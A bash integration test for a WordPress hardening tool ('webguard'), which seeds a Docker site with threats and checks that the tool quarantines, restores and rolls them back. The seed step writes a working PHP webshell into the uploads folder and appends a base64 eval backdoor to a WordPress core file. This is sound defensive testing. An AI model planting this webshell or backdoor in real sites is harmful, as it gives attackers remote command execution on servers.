#!/usr/bin/env bash
# WordPress + nginx + PHP-FPM 통합 테스트 (온라인 필요: WordPress 체크섬/배포본)
#   시드: 업로드 폴더 웹셸, 코어 파일 변조, .git, DB 덤프, 777 업로드 폴더
#   검증: 적용 후 사이트 정상 / 위협 차단 / 코어 복원 / 롤백 시 원상복구(파일 + nginx 설정)
set -u
cd "$(dirname "$0")"
P="docker compose -p wgwp"
pass=0; fail=0
ok()  { echo "  PASS: $*"; pass=$((pass+1)); }
bad() { echo "  FAIL: $*"; fail=$((fail+1)); }
chk() { if eval "$2"; then ok "$1"; else bad "$1"; fi; }
X() { $P exec -T wp bash -c "$1"; }
code() { X "curl -s -o /dev/null -w '%{http_code}' 'http://localhost$1'"; }

$P down -v >/dev/null 2>&1
$P up -d --build >/dev/null 2>&1 || { echo "compose 실패"; exit 1; }
for i in $(seq 1 60); do X 'test -f /var/www/html/wp-config.php && curl -s -o /dev/null http://localhost/wp-admin/install.php' >/dev/null 2>&1 && break; sleep 2; done
sleep 3
X 'curl -s -o /dev/null --data "weblog_title=WG+Test&user_name=admin&admin_password=Adm1n-Pass-123%21&admin_password2=Adm1n-Pass-123%21&pw_weak=1&admin_email=admin%40example.com&blog_public=0" "http://localhost/wp-admin/install.php?step=2"'

echo "== 시드"
X '
set -e
mkdir -p /var/www/html/wp-content/uploads/2024/01
echo "<?php if(isset(\$_REQUEST[\"cmd\"])){ system(\$_REQUEST[\"cmd\"]); } eval(base64_decode(\$_POST[\"z\"])); ?>" > /var/www/html/wp-content/uploads/2024/01/cache.php
f=/var/www/html/wp-includes/class-wp-hook.php; cp $f /root/class-wp-hook.orig
echo "if (isset(\$_POST[\"wgx\"])) { @eval(base64_decode(\$_POST[\"wgx\"])); }" >> $f
mkdir -p /var/www/html/.git && echo "ref: refs/heads/main" > /var/www/html/.git/HEAD
echo "-- dump" > /var/www/html/db-backup.sql
chown -R www-data:www-data /var/www/html; chmod 777 /var/www/html/wp-content/uploads
rm -rf /root/site-snapshot; cp -a /var/www/html /root/site-snapshot
nginx -T 2>/dev/null > /root/nginx-before.txt
rm -rf /var/lib/webguard /var/backups/webguard'
chk "시드 후 홈 200" '[ "$(code /)" = 200 ]'
chk "시드: 웹셸 실행 가능(공격 성공 상태)" '[ "$(X "curl -s \"http://localhost/wp-content/uploads/2024/01/cache.php?cmd=echo+PWNED\"")" = PWNED ]'

echo "== webguard run + apply"
X 'WG_NO_COLOR=1 /opt/webguard/webguard run --root /var/www/html --url http://localhost' >/tmp/wgwp.run.log 2>&1
sed -n '/변경 계획 수립/,/계획:/p' /tmp/wgwp.run.log
X 'WG_NO_COLOR=1 /opt/webguard/webguard apply --root /var/www/html --yes --reload-php' >/tmp/wgwp.apply.log 2>&1
sed -n '/적용 직전/,$p' /tmp/wgwp.apply.log | grep -vE '^\s+\['

echo "== 적용 후 검증"
chk "홈 200" '[ "$(code /)" = 200 ]'
chk "로그인 페이지 200" '[ "$(code /wp-login.php)" = 200 ]'
chk "관리자 리다이렉트(302)" '[ "$(code /wp-admin/)" = 302 ]'
chk "업로드 웹셸 격리" 'X "test ! -e /var/www/html/wp-content/uploads/2024/01/cache.php"'
chk "업로드 폴더 신규 PHP 실행 차단(nginx)" 'X "echo \"<?php echo 7*6;\" > /var/www/html/wp-content/uploads/t.php"; r=$(code /wp-content/uploads/t.php); X "rm -f /var/www/html/wp-content/uploads/t.php"; [ "$r" = 403 ]'
chk "업로드 이미지 등 정적파일은 정상" 'X "echo hi > /var/www/html/wp-content/uploads/a.txt"; r=$(code /wp-content/uploads/a.txt); X "rm -f /var/www/html/wp-content/uploads/a.txt"; [ "$r" = 200 ]'
chk ".git 차단" '[ "$(code /.git/HEAD)" = 403 ]'
chk "DB 덤프 차단" '[ "$(code /db-backup.sql)" = 403 ]'
chk "readme.html 차단" '[ "$(code /readme.html)" = 403 ]'
chk "변조된 코어 파일 공식본으로 복원" 'X "cmp -s /var/www/html/wp-includes/class-wp-hook.php /root/class-wp-hook.orig"'
chk "DISALLOW_FILE_EDIT 추가 + 문법 정상" 'X "grep -q DISALLOW_FILE_EDIT /var/www/html/wp-config.php && php -l /var/www/html/wp-config.php >/dev/null"'
chk ".user.ini 세션 보안 반영" 'X "echo \"<?php echo ini_get(\\\"session.cookie_httponly\\\");\" > /var/www/html/wgt.php"; r="$(X "curl -s http://localhost/wgt.php")"; X "rm -f /var/www/html/wgt.php"; [ "$r" = 1 ]'
chk "Server 헤더 버전 숨김" '! X "curl -sI http://localhost/" | grep -i "^Server:" | grep -q "/[0-9]"'
chk "업로드 폴더 o-w" 'X "stat -c %a /var/www/html/wp-content/uploads" | grep -q 775 || X "stat -c %a /var/www/html/wp-content/uploads" | grep -q 755'
chk "verify 명령 정상" 'X "WG_NO_COLOR=1 /opt/webguard/webguard verify --root /var/www/html" >/dev/null 2>&1'

echo "== 롤백"
X 'WG_NO_COLOR=1 /opt/webguard/webguard rollback --root /var/www/html --yes' >/tmp/wgwp.rb.log 2>&1
tail -2 /tmp/wgwp.rb.log
D="$(X 'diff -r /root/site-snapshot /var/www/html 2>&1')"
chk "롤백 후 문서루트 원상복구" '[ -z "$D" ]'
[ -n "$D" ] && echo "$D" | head -10
chk "롤백 후 nginx 설정 원상복구" 'X "nginx -T 2>/dev/null | diff -q - /root/nginx-before.txt >/dev/null"'
chk "롤백 후 홈 200" '[ "$(code /)" = 200 ]'

echo
echo "결과: PASS $pass / FAIL $fail"
[ "$fail" = 0 ]
